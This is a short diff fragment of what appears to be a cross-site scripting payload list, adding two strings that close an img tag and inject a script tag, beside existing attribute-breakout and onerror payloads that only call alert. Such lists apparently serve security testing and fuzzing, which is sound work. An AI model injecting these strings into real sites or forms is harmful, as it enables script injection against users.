@@ -8,3 +8,5 @@
 /><img onerror="alert(1)"></img>
 ="alert(1)"></
 ');alert(XSS)"></
+#'</img><script>alert(1)</script>
+'</img><script>alert(1)</script>
